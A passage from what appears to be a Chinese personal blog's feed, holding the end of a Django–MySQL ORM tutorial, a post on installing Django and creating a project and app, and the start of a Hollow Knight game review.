class="keyword">table</span> app01_userinfo(</span><br><span class="line">id <span class="type">bigint</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">32</span>),</span><br><span class="line">password <span class="type">varchar</span>(<span class="number">64</span>),</span><br><span class="line">age <span class="type">int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>在 MySQL 终端输入</p><div class="tag-plugin copy"><input class="copy-area" id="copy_7" value="show tables;"><button class="copy-btn" onclick="util.copy(&quot;copy_7&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>终端输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+----------------------------+</span><br><span class="line">| Tables_in_webapp |</span><br><span class="line">+----------------------------+</span><br><span class="line">| app01_userinfo |</span><br><span class="line">| auth_group |</span><br><span class="line">| auth_group_permissions |</span><br><span class="line">| auth_permission |</span><br><span class="line">| auth_user |</span><br><span class="line">| auth_user_groups |</span><br><span class="line">| auth_user_user_permissions |</span><br><span class="line">| django_admin_log |</span><br><span class="line">| django_content_type |</span><br><span class="line">| django_migrations |</span><br><span class="line">| django_session |</span><br><span class="line">+----------------------------+</span><br><span class="line">11 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>这表明，<code>app01_userinfo</code>的表已经被创建。当然，这里其他的表示 Django 内部的其他类，我们这里无需在意。接下来我们检查字段。MySQL 终端输入</p><div class="tag-plugin copy"><input class="copy-area" id="copy_8" value="desc app01_userinfo;"><button class="copy-btn" onclick="util.copy(&quot;copy_8&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>观察到输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc app01_userinfo;</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field | Type | Null | Key | Default | Extra |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id | bigint | NO | PRI | NULL | auto_increment |</span><br><span class="line">| name | varchar(32) | NO | | NULL | |</span><br><span class="line">| password | varchar(64) | NO | | NULL | |</span><br><span class="line">| age | int | NO | | NULL | |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>其中，<code>name</code>，<code>password</code>和<code>age</code>都是我们所定义的字段，<code>id</code>是 Django 自动创建的字段。</p><h2 id="修改表"><a class="markdownIt-Anchor" href="#修改表"></a> 修改表</h2><p>  当然，我们也免不了修改表的字段数，例如，我们不需要<code>age</code>这一个字段了，我们只需要在<code>models.py</code>下删除之。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line">class UserInfo(models.Model):</span><br><span class="line">name = models.CharField(max_length=32)</span><br><span class="line">password = models.CharField(max_length=64)</span><br><span class="line"></span><br><span class="line"><span class="deletion">- age = models.IntegerField(default=0)</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>然后重新在终端执行<code>makemigrations</code>和<code>migrate</code>二连，我们就可以观察到这一字段消失了。</p><p>  有时候，我们也会为表中新增字段，例如：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line">class UserInfo(models.Model):</span><br><span class="line">name = models.CharField(max_length=32)</span><br><span class="line">password = models.CharField(max_length=64)</span><br><span class="line">age = models.IntegerField(default=0)</span><br><span class="line"></span><br><span class="line"><span class="deletion">- sex = models.CharField(max_length=4)</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>执行数据迁移二连，我们会发现控制台有警报。</p><p><img src="https://i.imgtg.com/2022/07/20/rovbC.jpg" alt="控制台警报" /></p><p>这是因为，当我们添加字段时，如果表中有数据，那么这些数据的新字段的值我们就不得而知。因此，会产生上述的告警。控制台给了我们两种解决方式：</p><ol><li>为已有的数据分配初始值来填补这些空缺；</li><li>在<code>models.py</code>中声明初始值。</li></ol><p>对于选择 1，我们可以将已有的数据的该字段的值赋值成为我们指定的值，这里不多说了。对于选择 2，则需要为该字段指定默认值，那么上述语句可以被重写成</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class UserInfo(models.Model):</span><br><span class="line">name = models.CharField(max_length=32)</span><br><span class="line">password = models.CharField(max_length=64)</span><br><span class="line">age = models.IntegerField(default=0)</span><br><span class="line"></span><br><span class="line"><span class="deletion">- sex = models.CharField(max_length=4)</span></span><br><span class="line"></span><br><span class="line">* sex = models.CharField(max_length=4, default=&#x27;male&#x27;)</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>于是，控制台告警消失，并且之前所有已存在的数据的新字段都被赋值为初始值。当然了，你也可以声明该字段允许为空，例如：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class UserInfo(models.Model):</span><br><span class="line">name = models.CharField(max_length=32)</span><br><span class="line">password = models.CharField(max_length=64)</span><br><span class="line">age = models.IntegerField(default=0)</span><br><span class="line"></span><br><span class="line"><span class="deletion">- sex = models.CharField(max_length=4, default=&#x27;male&#x27;)</span></span><br><span class="line"></span><br><span class="line">* sex = models.CharField(max_length=4,blank=True,null=True)</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>这样也是可以的。</p><h1 id="使用-django-操作-mysql-中的数据"><a class="markdownIt-Anchor" href="#使用-django-操作-mysql-中的数据"></a> 使用 Django 操作 MySQL 中的数据</h1><p>  我们依然可以用 python 语句来操作 MySQL 中的数据。</p><h2 id="创建数据"><a class="markdownIt-Anchor" href="#创建数据"></a> 创建数据</h2><p>  创建数据的语法是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;类名&#125;.objects.create(参数列表)</span><br></pre></td></tr></table></figure><p>例如我们需要在<code>app01_userinfo</code>中插入一段记录，以下就是一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserInfo.objects.create(name=<span class="string">&quot;Felix&quot;</span>, password=<span class="string">&quot;123&quot;</span>, age=<span class="number">19</span>)</span><br></pre></td></tr></table></figure><p>这句 python 会被 orm 翻译成 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> app01_userinfo(name, password, age)<span class="keyword">value</span>(&quot;Felix&quot;, &quot;123&quot;, <span class="number">19</span>)</span><br></pre></td></tr></table></figure><h2 id="删除数据"><a class="markdownIt-Anchor" href="#删除数据"></a> 删除数据</h2><p>  删除数据的语法是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;类名&#125;.objects.<span class="built_in">filter</span>(筛选条件).delete()</span><br></pre></td></tr></table></figure><p>如果你要清空数据，那么可以写成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;类名&#125;.objects.<span class="built_in">all</span>().delete()</span><br></pre></td></tr></table></figure><p>当然，过滤函数还有许多写法，这里只展示了<code>filter()</code>和<code>all()</code>。</p><h2 id="查找数据"><a class="markdownIt-Anchor" href="#查找数据"></a> 查找数据</h2><p>  查找数据的语法是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;类名&#125;.objects.<span class="built_in">filter</span>(筛选条件)</span><br></pre></td></tr></table></figure><p>函数的返回值是一个<code>QuerySet</code>类型，在 python 中，其可以被理解成<strong>结构体对象的列表</strong>，例如</p><div class="tag-plugin colorful note" ><div class="body"><p>[&lt;UserInfo: UserInfo object (1)&gt;, &lt;UserInfo: UserInfo object (2)&gt;, &lt;UserInfo: UserInfo object (3)&gt;]</p></div></div><p>如果我们要读取其内部值，就可以用简单的 python 语法实现，这里举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user_info_list = UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> user_info_list:</span><br><span class="line"><span class="built_in">print</span>(obj.<span class="built_in">id</span>, obj.name, obj.password, obj.age)</span><br></pre></td></tr></table></figure><p>当然，如果我们明确知道表中只有一行数据，那么我们可以避免使用循环，直接用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj = UserInfo.objects.<span class="built_in">all</span>().first()</span><br></pre></td></tr></table></figure><p>获取对象即可。</p><h2 id="更新数据"><a class="markdownIt-Anchor" href="#更新数据"></a> 更新数据</h2><p>  更新数据，首先要找到需要更新的记录，因此，前一部分与查找是很相似的。<code>update()</code>函数完成后续的更新操作，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">2</span>).update(password = <span class="string">&quot;999&quot;</span>)</span><br></pre></td></tr></table></figure><p>则被筛选出的记录的<code>password</code>字段都会被更新成<code>999</code>。</p><h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1><p>  有了与数据库的联动操作，我们已经可以写一些基础的业务逻辑了。当然，Django 对于数据库的操作远不止这些。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用 django 操作 mysql 数据库。&lt;/p&gt;</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="框架" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="django" scheme="https://blog.snowflake.zone/tags/django/"/>
    
    <category term="python" scheme="https://blog.snowflake.zone/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>django学习笔记(1)：Django的安装与准备</title>
    <link href="https://blog.snowflake.zone/posts/8/"/>
    <id>https://blog.snowflake.zone/posts/8/</id>
    <published>2022-07-17T16:00:00.000Z</published>
    <updated>2022-07-17T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>开一个新坑，django 开发。</p><span id="more"></span><h1 id="django-介绍"><a class="markdownIt-Anchor" href="#django-介绍"></a> Django 介绍</h1><p>  Django 是一个开放源代码的 Web 应用框架，由 Python 写成。利用 Django 和相关的 html 和 CSS 知识，我们可以轻松构建出一个简单的网站。本文主要介绍使用 Django 的一些准备工作。</p><h1 id="安装-django"><a class="markdownIt-Anchor" href="#安装-django"></a> 安装 Django</h1><p>  首先，你需要 Python 环境。这里以 Python3 环境为例。安装有两种方式：<strong>命令行安装</strong>和<strong>使用开发软件 Pycharm</strong>。</p><div class="tag-plugin tabs" align="center"id="tab_1"><div class="nav-tabs"><div class="tab active"><a href="#tab_1-1">使用命令行</a></div><div class="tab"><a href="#tab_1-2">Pycharm中使用</a></div></div><div class="tab-content"><div class="tab-pane active" id="tab_1-1"><p>  这里以 Linux 操作系统为例。首先打开命令行窗口，建立虚拟环境。</p><div class="tag-plugin copy"><input class="copy-area" id="copy_1" value="python -m venv ll_env"><button class="copy-btn" onclick="util.copy(&quot;copy_1&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>而后激活此虚拟环境。</p><div class="tag-plugin copy"><input class="copy-area" id="copy_2" value="source ll_env/bin/activate"><button class="copy-btn" onclick="util.copy(&quot;copy_2&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>如果想要停止此虚拟环境，你可以使用<code>deactivate</code>来关闭之。然后我们来下载 Django。</p><div class="tag-plugin copy"><input class="copy-area" id="copy_3" value="pip install Django"><button class="copy-btn" onclick="util.copy(&quot;copy_3&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><div class="tag-plugin colorful note" color="blue"><div class="body"><p>如果下载速度很慢，你可以尝试更换成国内镜像源。例如<code>pip install Django -i https://pypi.tuna.tsinghua.edu.cn/simple</code></p><ul><li>清华：<a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></li><li>阿里云：<a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></li><li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a></li><li>华中理工大学：<a href="http://pypi.hustunique.com/">http://pypi.hustunique.com/</a></li><li>山东理工大学：<a href="http://pypi.sdutlinux.org/">http://pypi.sdutlinux.org/</a></li><li>豆瓣：<a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></li></ul></div></div></div><div class="tab-pane" id="tab_1-2"><p>Pycharm 中的使用相对而言简单许多。在项目文件下新建项目，而后在<u>文件-&gt;设置-&gt;项目-&gt;Python解释器</u>中安装 Django 即可。</p></div></div></div><h1 id="开始使用-django"><a class="markdownIt-Anchor" href="#开始使用-django"></a> 开始使用 Django</h1><h2 id="新建-django-项目"><a class="markdownIt-Anchor" href="#新建-django-项目"></a> 新建 Django 项目</h2><p>  下载完 Django 库后，我们需要在我们的项目文件夹中新建一个 Django 项目，这将告诉 Django，这不是一个纯 Python 项目。首先我们在 Pycharm 的终端或者命令行窗口运行以下指令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject &lt;projectname&gt; .</span><br></pre></td></tr></table></figure><p>其中，<code>&lt;projectname&gt;</code>是项目名称。</p><div class="tag-plugin colorful note" color="blue"><div class="title">如果你使用的是Pycharm</div><div class="body"><p>Professional Edition，那么你可以直接在创建项目之初就创建Django项目，而无需上述的多步操作。但需要注意，在项目的<code>setting.py</code>中<code>TEMPLATES</code>中第一个字典的键<code>DIRS</code>存在<code>[os.path.join(BASE_DIR, templates)]</code>，它将影响静态文件查找位置，最好删去。</p></div></div><div class="tag-plugin colorful note" color="red"><div class="body"><p>注意，上述的命令语句千万不要忘记末尾的<code>.</code>。遗漏了这个句点将在后续项目部署上需要额外的复杂操作。</p></div></div><p>  最后运行<code>python manage.py runserver</code>，检查 Django 是否能正确运行。若可以，则初步配置成功。</p><h2 id="django-项目中的文件结构"><a class="markdownIt-Anchor" href="#django-项目中的文件结构"></a> Django 项目中的文件结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;projectname&gt;</span><br><span class="line">├─manage.py       【项目管理、启动项目、创建应用、数据管理】【无需更改】</span><br><span class="line">│</span><br><span class="line">└─&lt;projectname&gt;</span><br><span class="line">   ├─__init__.py</span><br><span class="line">   ├─settings.py  【项目配置文件】【例如注册应用、链接数据库】</span><br><span class="line">   ├─urls.py      【url和函数对应关系】【主要编写的部分】</span><br><span class="line">   ├─asgi.py      【接收网络请求】【无需更改】</span><br><span class="line">   └─vsgi.py      【接收网络请求】【无需更改】</span><br></pre></td></tr></table></figure><h2 id="新建应用"><a class="markdownIt-Anchor" href="#新建应用"></a> 新建应用</h2><p>  根据项目的业务逻辑，我们将其分为多个应用来分开管理。我们先新建第一个应用，在终端输入命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py startapp &lt;appname&gt;</span><br></pre></td></tr></table></figure><p>于是我们得到这样的目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;projectname&gt;</span><br><span class="line">├─manage.py       【项目管理、启动项目、创建应用、数据管理】【无需更改】</span><br><span class="line">│</span><br><span class="line">├─&lt;appname&gt;</span><br><span class="line">|  ├─__init__.py</span><br><span class="line">|  ├─admin.py     【后台管理界面】</span><br><span class="line">|  ├─apps.py      【启动类】</span><br><span class="line">|  ├─models.py    【在数据库中创建对应表】</span><br><span class="line">|  ├─tests.py     【测试类】</span><br><span class="line">|  ├─views.py     【函数】</span><br><span class="line">|  └─migrations   【数据库迁移记录】</span><br><span class="line">|       └─__init__.py</span><br><span class="line">|</span><br><span class="line">└─&lt;projectname&gt;</span><br><span class="line">   ├─__init__.py</span><br><span class="line">   ├─settings.py  【项目配置文件】【例如注册应用、链接数据库】</span><br><span class="line">   ├─urls.py      【url和函数对应关系】【主要编写的部分】</span><br><span class="line">   ├─asgi.py      【接收网络请求】【无需更改】</span><br><span class="line">   └─vsgi.py      【接收网络请求】【无需更改】</span><br></pre></td></tr></table></figure><p>  新建应用后，我们需要对其<strong>注册</strong>。我们找到应用下的<code>apps.py</code>，找到其启动类类名，以下是一个例子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: apps.py</span></span><br><span class="line"><span class="keyword">from</span> django.apps <span class="keyword">import</span> AppConfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App01Config</span>(<span class="title class_ inherited__">AppConfig</span>):</span><br><span class="line">    default_auto_field = <span class="string">&#x27;django.db.models.BigAutoField&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;app01&#x27;</span></span><br></pre></td></tr></table></figure><p>于是我们修改<code>settings.py</code>中的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: settings.py</span></span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line"></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># 省略</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&lt;appname&gt;.apps.APP01Config&#x27;</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">#省略</span></span><br></pre></td></tr></table></figure><p>于是，新的应用已经注册完毕，我们可以在该应用上开发了。</p>]]></content>
    
    
    <summary type="html">django是一款基于python的网站开发工具。本文主要介绍Django的安装与使用前准备。</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="框架" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="django" scheme="https://blog.snowflake.zone/tags/django/"/>
    
    <category term="python" scheme="https://blog.snowflake.zone/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>《Hollow Knight(空洞骑士)》简评</title>
    <link href="https://blog.snowflake.zone/posts/7/"/>
    <id>https://blog.snowflake.zone/posts/7/</id>
    <published>2022-07-07T16:00:00.000Z</published>
    <updated>2022-07-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>这次打算写点不一样的，就来浅浅聊一下最近走完主线剧情的《Hollow Knight(空洞骑士)》吧。</p><span id="more"></span><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>  《空洞骑士》这款游戏其实一直存在于笔者的愿望单里，但是有好长一段时间也是仅仅存在于愿望单里而已。后来在室友的强烈推荐、并且Steam促销的双重驱动下，还是下载了这款游戏。6月份期末周一结束，便下定决心体验这款游戏。玩了40h也勉强算是通关了主线剧情。这里就简要地说一说自己想说的吧。</p><h1 id="关于游戏"><a class="markdownIt-Anchor" href="#关于游戏"></a> 关于游戏</h1><h2 id="谈谈设计"><a class="markdownIt-Anchor" href="#谈谈设计"></a> 谈谈设计</h2><h3 id="boss设计"><a class="markdownIt-Anchor" href="#boss设计"></a> BOSS设计</h3><p>  如果要简单地概括《空洞骑士》的游戏形式，我想“平台跳跃游戏”的标签就足够让大家知道其游玩形式了。此外，这款平台跳跃游戏还包含了“魂类游戏的要素”，简而言之，就是不低的死亡成本和难度较高的BOSS设计。其实玩家们都会知道一个说法：三螳螂是多少新手的噩梦。</p><div class="tag-plugin image"><div class="image-bg" style="background:white;padding:16px;"><img src="https://i.imgtg.com/2022/07/11/eKWEI.jpg" alt="新手劝退关：三螳螂之战" data-fancybox="true" style="width:200px;"/></div><div class="image-meta"><span class="image-caption center">新手劝退关：三螳螂之战</span></div></div><p>  但其实，具有一定难度的BOSS设计也在很大程度上增加了游戏的可玩性。<strong>与其使用炫酷的特效和画面来告诉一个玩家你将面对的敌人有多么强大，倒不如直接让玩家体会被BOSS击败的无力感。</strong> 当然了，这也为游戏制作者带来了不少的挑战：难度如何把控？如何让每一个不同的BOSS都有其特色？这其实是不容易把握的。笔者曾经体验过《Sekiro: Shadows Die Twice(只狼：影逝二度)》这款游戏。虽然这部作品依然非常出色，但其实有部分BOSS（或者严谨的说，精英怪）的设计是有些重复的（比如蚺蛇重藏和牛饮德次郎，但也有人认为他们其实是一个人，这里就不展开讨论了）。但不得不说，《空洞骑士》的BOSS设计并不会让人觉得厌烦，面对新的BOSS，总有新的打法可以尝试。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/eK0gc.jpg" alt="下砸老师：粪虫防御者" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">下砸老师：粪虫防御者</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/eKSbq.jpg" alt="黑冲老师：叛徒领主" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">黑冲老师：叛徒领主</span></div></div><h3 id="操作设计"><a class="markdownIt-Anchor" href="#操作设计"></a> 操作设计</h3><p>  在玩家操作上，《空洞骑士》没有采用大量的按键、或者是游戏内技能选择来控制技能释放，所有的技能都可以通过少量键位完成释放。单纯攻击键，直接释放是平砍、与“上”键组合是上砍；与“下”组合是下劈(非常有技术含量的操作)；长按攻击键蓄力，通过独自释放、与上键组合、与下键组合完成三种不同的剑技；跳跃键按住时长控制跳跃幅度；长按施法是恢复等等。键位虽少，但是用好谈何容易。真正熟练之后，你会发现，看似不可能的道路可以通过下劈、二段跳、冲刺的组合轻松越过，竞技场的可以足不沾地与对手们进行空战等等。其实主角并没有飞行的能力，但又何尝不像在飞行。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/eZzCj.jpg" alt="竞技场空战：下劈、二段跳、螳螂抓钩的奇妙组合" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">竞技场空战：下劈、二段跳、螳螂抓钩的奇妙组合</span></div></div><h2 id="谈谈剧情"><a class="markdownIt-Anchor" href="#谈谈剧情"></a> 谈谈剧情</h2><p>  故事发生在一个称为“圣巢”的底下虫子王国里。上古时期，圣巢被虚空之力所占领。在这里，虚空才是一切的主宰。后来，名为幅光的神驻留在此地，利用自身的光芒将虚空的黑暗逐步逼退，最后将其困于深渊之中。自此，幅光便是这个王国的唯一领袖，圣巢也在他的带领下逐渐繁荣昌盛。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/evsuI.jpg" alt="幅光" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">幅光</span></div></div><p>  但后来，一只名为沃姆的虫子路过此地，有了驻足此地的想法。沃姆与幅光对于圣巢的统治有着根本的不一致观点。幅光，主张思想上的统一，反对繁衍；而沃姆，却强调虫子的多样性。于是，沃姆和幅光的大战一触即发。但是，沃姆不敌幅光，在大战中败下阵来，就此死去。</p><p>  但需要注意的是，在《空洞骑士》的世界观中，死亡并非消逝。所有的死亡，都会留下踪迹。沃姆也是这样。白王，就是沃姆死后的化身。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/evYFD.jpg" alt="白王的遗迹" 